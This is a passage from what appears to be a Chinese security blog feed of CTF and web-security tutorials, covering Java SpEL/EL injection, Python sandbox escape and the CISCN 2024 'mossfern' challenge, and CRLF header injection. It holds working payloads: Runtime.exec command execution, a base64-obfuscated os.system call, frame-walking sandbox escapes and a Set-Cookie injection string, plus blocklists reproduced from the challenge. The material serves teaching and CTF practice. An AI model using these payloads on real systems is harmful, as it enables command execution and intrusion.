class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;)&#125;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>其他payload</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$&#123;pageContext&#125; 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）<br><br>$&#123;pageContext<span class="hljs-selector-class">.getSession</span>()<span class="hljs-selector-class">.getServletContext</span>()<span class="hljs-selector-class">.getClassLoader</span>()<span class="hljs-selector-class">.getResource</span>(<span class="hljs-string">&quot;&quot;</span>)&#125;   获取web路径<br><br>$&#123;header&#125;  文件头参数<br><br>$&#123;applicationScope&#125; 获取webRoot<br><br>$&#123;pageContext<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.getSession</span>()<span class="hljs-selector-class">.setAttribute</span>(<span class="hljs-string">&quot;a&quot;</span>,pageContext<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.forName</span>(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<span class="hljs-selector-class">.getMethod</span>(<span class="hljs-string">&quot;getRuntime&quot;</span>,null)<span class="hljs-selector-class">.invoke</span>(null,null)<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;命令&quot;</span>)<span class="hljs-selector-class">.getInputStream</span>())&#125;  执行命令<br><br><br><span class="hljs-comment">// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。</span><br><br>&lt;<span class="hljs-selector-tag">p</span> <span class="hljs-selector-tag">th</span>:text=<span class="hljs-string">&quot;$&#123;#this.getClass().forName(&#x27;java.lang.System&#x27;).getProperty(&#x27;user.dir&#x27;)&#125;&quot;</span>&gt;&lt;/p&gt;   <span class="hljs-comment">//获取web路径</span><br></code></pre></td></tr></table></figure><h5 id="过滤t"><a class="markdownIt-Anchor" href="#过滤t"></a> 过滤<code>T(</code></h5><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">&#x27;<span class="hljs-symbol">&#x27;.class.forname</span>(<span class="hljs-symbol">&#x27;java.lang.Runtime</span>&#x27;)<br></code></pre></td></tr></table></figure><h3 id="防御"><a class="markdownIt-Anchor" href="#防御"></a> 防御</h3><p>使用SimpleEvaluationContext替换StandardEvaluationContext</p><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <em>参考</em></h3><p><em><a href="https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">https://www.mi1k7ea.com/2020/01/10/SpEL表达式注入漏洞总结/</a></em></p><p><a href="https://forum.butian.net/share/2483">https://forum.butian.net/share/2483</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python沙箱逃逸</title>
    <link href="/2024/05/22/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <url>/2024/05/22/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h2><p>python的沙箱就是去模拟python的终端运行代码，为了使运行后的结果不影响当前的程序。通常是写好了一个模板（只能执行特定的功能），然后要运行时把输入的东西写入模板然后创建新的模板文件（python文件）在一个目录下运行（相当于一个沙箱），获得结果之后就把这个新的模板文件删除掉。沙箱逃逸就是为了使得能够在沙箱中通过某种绕过的方式，从模拟的沙箱环境中逃逸出来，从而实现执行系统命令等攻击操作。</p><h2 id="方法"><a class="markdownIt-Anchor" href="#方法"></a> 方法</h2><h3 id="利用元素链进行绕过"><a class="markdownIt-Anchor" href="#利用元素链进行绕过"></a> 利用元素链进行绕过</h3><h4 id="过滤"><a class="markdownIt-Anchor" href="#过滤"></a> 过滤</h4><h5 id="参照ssti"><a class="markdownIt-Anchor" href="#参照ssti"></a> 参照SSTI</h5><p>可以转换成SSTI用fenjing绕过</p><h5 id="base64编码"><a class="markdownIt-Anchor" href="#base64编码"></a> base64编码</h5><p>对关键字进行base64编码可绕过一些明文检测机制：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import base64<br>base64<span class="hljs-selector-class">.b64encode</span>(<span class="hljs-string">&#x27;__import__&#x27;</span>) #<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span><br>base64<span class="hljs-selector-class">.b64encode</span>(<span class="hljs-string">&#x27;os&#x27;</span>) #<span class="hljs-string">&#x27;b3M=&#x27;</span><br>__builtins__.__dict__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;X19pbXBvcnRfXw==&#x27;</span>.decode(<span class="hljs-string">&#x27;base64&#x27;</span>)]</span>(<span class="hljs-string">&#x27;b3M=&#x27;</span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;base64&#x27;</span>))<span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;calc&#x27;</span>)<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h5 id="reload方法"><a class="markdownIt-Anchor" href="#reload方法"></a> reload()方法</h5><p>如果某个方法被题目删除了，可以通过reload重新加载</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">reload</span><span class="hljs-params">(__builtins__)</span></span><br></code></pre></td></tr></table></figure><h3 id="利用栈帧沙箱逃逸"><a class="markdownIt-Anchor" href="#利用栈帧沙箱逃逸"></a> 利用栈帧沙箱逃逸</h3><h4 id="生成器"><a class="markdownIt-Anchor" href="#生成器"></a> 生成器</h4><p>生成器（Generator）是 Python 中一种特殊的迭代器，它可以通过简单的函数和表达式来创建。生成器的主要特点是能够逐个产生值，并且在每次生成值后保留当前的状态，以便下次调用时可以继续生成值。这使得生成器非常适合处理大型数据集或需要延迟计算的情况。</p><p>在 Python 中，生成器可以使用 yield 关键字来定义。yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束。</p><p>yield 使用例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>    a=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">yield</span> a<br>        a+=<span class="hljs-number">1</span><br>f=f()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#2</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#3</span><br></code></pre></td></tr></table></figure><h4 id="生成器表达式"><a class="markdownIt-Anchor" href="#生成器表达式"></a> 生成器表达式</h4><p>很像列表，但这里是圆括号</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">a</span>=(i+<span class="hljs-number">1</span> for i in range(<span class="hljs-number">100</span>)) <br></code></pre></td></tr></table></figure><h4 id="栈帧frame"><a class="markdownIt-Anchor" href="#栈帧frame"></a> 栈帧(frame)</h4><p>在 Python 中，栈帧（stack frame），也称为帧（frame），是用于执行代码的数据结构。每当 Python 解释器执行一个函数或方法时，都会创建一个新的栈帧，用于存储该函数或方法的局部变量、参数、返回地址以及其他执行相关的信息。这些栈帧会按照调用顺序被组织成一个栈，称为调用栈。</p><p>栈帧包含了以下几个重要的属性：<br /><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br /><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br /><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br /><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br /><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈。</p><p><a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#frame-objects">https://docs.python.org/zh-cn/3/reference/datamodel.html#frame-objects</a></p><h5 id="代码对象"><a class="markdownIt-Anchor" href="#代码对象"></a> 代码对象</h5><p><a href="https://docs.python.org/zh-cn/3/reference/datamodel.html#code-objects">https://docs.python.org/zh-cn/3/reference/datamodel.html#code-objects</a></p><p><code>f_code</code>既然可以获得代码对象，那就可以利用代码对象的一些属性来读一些重要的信息,比如co_consts能够获取一个包含函数中的 bytecode 所使用的字面值的 tuple，这个可以读到文件中很多的内容。</p><h4 id="利用"><a class="markdownIt-Anchor" href="#利用"></a> 利用</h4><p>原理就是通过生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表</p><p>正常没在沙箱中的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">s3cret=<span class="hljs-string">&quot;this is flag&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>        <span class="hljs-keyword">yield</span> g.gi_frame<br><br>    g = f()  <span class="hljs-comment">#生成器</span><br>    frame = <span class="hljs-built_in">next</span>(g) <span class="hljs-comment">#获取到生成器的栈帧对象</span><br>    b = frame.f_globals[<span class="hljs-string">&#x27;s3cret&#x27;</span>] <span class="hljs-comment">#返回并获取前一级栈帧的globals</span><br>    <span class="hljs-keyword">return</span> b<br><span class="hljs-built_in">print</span>(test())<br><span class="hljs-comment">#this is flag</span><br></code></pre></td></tr></table></figure><p>在沙箱中运行的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">s3cret=<span class="hljs-string">&quot;this is flag&quot;</span><br><br>codes=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def waff():</span><br><span class="hljs-string">    def f():</span><br><span class="hljs-string">        yield g.gi_frame.f_back</span><br><span class="hljs-string"></span><br><span class="hljs-string">    g = f()  #生成器</span><br><span class="hljs-string">    frame = next(g) #获取到生成器的栈帧对象</span><br><span class="hljs-string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals，也可以 b = frame.f_back.f_back.f_locals[&#x27;s3cret&#x27;]</span><br><span class="hljs-string">    return b</span><br><span class="hljs-string">b=waff()</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-built_in">locals</span>=&#123;&#125;<br>code = <span class="hljs-built_in">compile</span>(codes, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)<br><span class="hljs-built_in">exec</span>(code,<span class="hljs-built_in">locals</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">locals</span>[<span class="hljs-string">&quot;b&quot;</span>])<br></code></pre></td></tr></table></figure><p>f_back多少次得自己试了（不知道怎么算的）</p><p>next函数被过滤时可以用<code>[x for x in g][0]</code>绕过</p><h4 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h4><h4 id="ciscn-2024-mossfern"><a class="markdownIt-Anchor" href="#ciscn-2024-mossfern"></a> CISCN 2024 mossfern</h4><p>运行后沙箱的样子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">source_simple_check</span>(<span class="hljs-params">source</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Check the source with pure string in string, prevent dangerous strings</span><br><span class="hljs-string">    :param source: source code</span><br><span class="hljs-string">    :return: None</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> exit<br>    <span class="hljs-keyword">from</span> builtins <span class="hljs-keyword">import</span> <span class="hljs-built_in">print</span><br><br>    <span class="hljs-keyword">try</span>:<br>        source.encode(<span class="hljs-string">&quot;ascii&quot;</span>)<br>    <span class="hljs-keyword">except</span> UnicodeEncodeError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;non-ascii is not permitted&quot;</span>)<br>        exit()<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;__&quot;</span>, <span class="hljs-string">&quot;getattr&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>]: <span class="hljs-comment">#过滤</span><br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> source.lower():<br>            <span class="hljs-built_in">print</span>(i)<br>            exit()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">block_wrapper</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span><br><span class="hljs-string">    :return: None</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">audit</span>(<span class="hljs-params">event, args</span>):<br><br>        <span class="hljs-keyword">from</span> builtins <span class="hljs-keyword">import</span> <span class="hljs-built_in">str</span>, <span class="hljs-built_in">print</span><br>        <span class="hljs-keyword">import</span> os<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;marshal&quot;</span>, <span class="hljs-string">&quot;__new__&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;os&quot;</span>, <span class="hljs-string">&quot;sys&quot;</span>, <span class="hljs-string">&quot;interpreter&quot;</span>, <span class="hljs-string">&quot;cpython&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>, <span class="hljs-string">&quot;gc&quot;</span>]:<br>            <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> (event + <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">str</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> args)).lower():<br>                <span class="hljs-built_in">print</span>(i)<br>                os._exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> audit<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source_opcode_checker</span>(<span class="hljs-params">code</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Check the source in the bytecode aspect, no methods and globals should be load</span><br><span class="hljs-string">    :param code: source code</span><br><span class="hljs-string">    :return: None</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">from</span> dis <span class="hljs-keyword">import</span> dis<br>    <span class="hljs-keyword">from</span> builtins <span class="hljs-keyword">import</span> <span class="hljs-built_in">str</span><br>    <span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br>    <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> exit<br><br>    opcodeIO = StringIO()<br>    dis(code, file=opcodeIO)<br>    opcode = opcodeIO.getvalue().split(<span class="hljs-string">&quot;\n&quot;</span>)<br>    opcodeIO.close()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> opcode:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(line) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;LOAD_GLOBAL&quot;</span>, <span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, <span class="hljs-string">&quot;LOAD_METHOD&quot;</span>]):<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(line) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;randint&quot;</span>, <span class="hljs-string">&quot;randrange&quot;</span>, <span class="hljs-string">&quot;print&quot;</span>, <span class="hljs-string">&quot;seed&quot;</span>]):<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join([x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;LOAD_GLOBAL&quot;</span>, <span class="hljs-string">&quot;IMPORT_NAME&quot;</span>, <span class="hljs-string">&quot;LOAD_METHOD&quot;</span>] <span class="hljs-keyword">if</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(line)]))<br>            exit()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    <span class="hljs-keyword">from</span> builtins <span class="hljs-keyword">import</span> <span class="hljs-built_in">open</span><br>    <span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> addaudithook<br>    <span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> redirect_stdout<br>    <span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint, randrange, seed<br>    <span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> StringIO<br>    <span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> seed<br>    <span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> time<br><br>    source = <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;./uploads/a179049a-1596-11ef-85cf-f09e4acd3f25.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br>    source_simple_check(source)<br>    source_opcode_checker(source)<br>    code = <span class="hljs-built_in">compile</span>(source, <span class="hljs-string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>) <span class="hljs-comment">#编译</span><br>    <span class="hljs-comment"># addaudithook(block_wrapper())</span><br>    outputIO = StringIO()<br>    <span class="hljs-keyword">with</span> redirect_stdout(outputIO):<br>        seed(<span class="hljs-built_in">str</span>(time()) + <span class="hljs-string">&quot;flag111&quot;</span> + <span class="hljs-built_in">str</span>(time()))<br>        <span class="hljs-built_in">exec</span>(code, &#123;<br>            <span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>,<br>            <span class="hljs-string">&quot;randint&quot;</span>: randint,<br>            <span class="hljs-string">&quot;randrange&quot;</span>: randrange,<br>            <span class="hljs-string">&quot;seed&quot;</span>: seed,<br>            <span class="hljs-string">&quot;print&quot;</span>: <span class="hljs-built_in">print</span><br>        &#125;, <span class="hljs-literal">None</span>)<br>    output = outputIO.getvalue()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;flag111&quot;</span> <span class="hljs-keyword">in</span> output:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bad code-operation why still happened ah?&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(output)<br><br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">waff</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():<br>        <span class="hljs-keyword">yield</span> g.gi_frame.f_back<br>    g = f()<br>    frame = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> g][<span class="hljs-number">0</span>]<br>    runner_frame = frame.f_back.f_back.f_back<br>    <span class="hljs-built_in">str</span>=runner_frame.f_globals[<span class="hljs-string">&quot;_&quot;</span>+<span class="hljs-string">&quot;_bui&quot;</span>+<span class="hljs-string">&quot;ltins_&quot;</span>+<span class="hljs-string">&quot;_&quot;</span>].<span class="hljs-built_in">str</span><br>    code=runner_frame.f_code.co_consts<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>(code):<br>        <span class="hljs-built_in">print</span>(i,end=<span class="hljs-string">&#x27;,&#x27;</span>)<br>waff()<br></code></pre></td></tr></table></figure><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> <em>参考</em></h3><p><em><a href="https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/">https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/</a></em></p><p><em><a href="https://xz.aliyun.com/t/13635">https://xz.aliyun.com/t/13635</a></em></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CRLF</title>
    <link href="/2024/05/10/CRLF/"/>
    <url>/2024/05/10/CRLF/</url>
    
    <content type="html"><![CDATA[<h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h3><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p><p>需要有http请求，才能利用crlf，要不然没法将构造的数据包发出去</p><h3 id="常见利用方式"><a class="markdownIt-Anchor" href="#常见利用方式"></a> 常见利用方式</h3><h4 id="location-字段的-302-跳转"><a class="markdownIt-Anchor" href="#location-字段的-302-跳转"></a> Location 字段的 302 跳转</h4><p>一般网站会在HTTP头中用 <code>Location: baidu.com</code> 这种方式来进行302跳转，如果我们能控制 <code>Location:</code> 后面的某个网址的URL，就可以进行HRS攻击。</p><p>例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>]))&#123;.                                                                                 <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:&quot;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于url是我们可控的，而Location最终会写到http相应正文中，所以通过加入<code>\r\n</code>就可以对http报文进行注入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=%0d%0aSet-Cookie: <span class="hljs-attribute">PHPSESSID</span>=whoami<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">302</span> <br><span class="hljs-attribute">Moved</span> Temporarily Date: Fri, <span class="hljs-number">27</span> Jun <span class="hljs-number">2014</span> <span class="hljs-number">17</span>:<span class="hljs-number">52</span>:<span class="hljs-number">17</span> GMT <br><span class="hljs-attribute">Content</span>- Type: text/html<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">154</span> <br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Location</span>: %<span class="hljs-number">0</span>d%<span class="hljs-number">0</span>aSet-Cookie: PHPSESSID=whoami<br></code></pre></td></tr></table></figure><h4 id="php-crlf攻击"><a class="markdownIt-Anchor" href="#php-crlf攻击"></a> PHP – CRLF攻击</h4><h5 id="fsockopen-函数"><a class="markdownIt-Anchor" href="#fsockopen-函数"></a> fsockopen() 函数</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-number">80</span>, <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (<span class="hljs-subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET / HTTP/1.1\r\n&quot;</span>;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>;<br>    <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>);<br>    <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123;<br>        